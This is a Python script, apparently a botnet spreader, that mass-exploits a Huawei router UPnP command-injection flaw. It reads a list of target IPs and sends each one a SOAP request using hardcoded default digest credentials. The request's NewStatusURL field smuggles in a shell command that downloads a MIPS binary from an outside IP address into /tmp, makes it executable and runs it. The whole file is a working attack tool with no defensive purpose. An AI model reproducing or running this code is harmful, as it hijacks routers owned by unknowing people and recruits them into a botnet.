#! python !#
import sys, socket, time, struct, threading, requests
from multiprocessing import Process
from Queue import *
from threading import Thread
from requests.auth import HTTPDigestAuth

# 0day for Huawei found by Nexus Zeta!

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
cmd = "busybox wget -g 185.237.96.86 -l /tmp/rsh -r /bins/mips ;chmod +x /tmp/rsh ;/tmp/rsh"
payload2 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

def rtek(host):
    try:
		url = "http://" + host + ":37215/ctrlt/DeviceUpgrade_1"
		requests.post(url, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
    except:
        pass
    return

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            sys.exit("Interrupted? (ctrl + c)")
    thread.join()
    return

if __name__ == "__main__":
    main()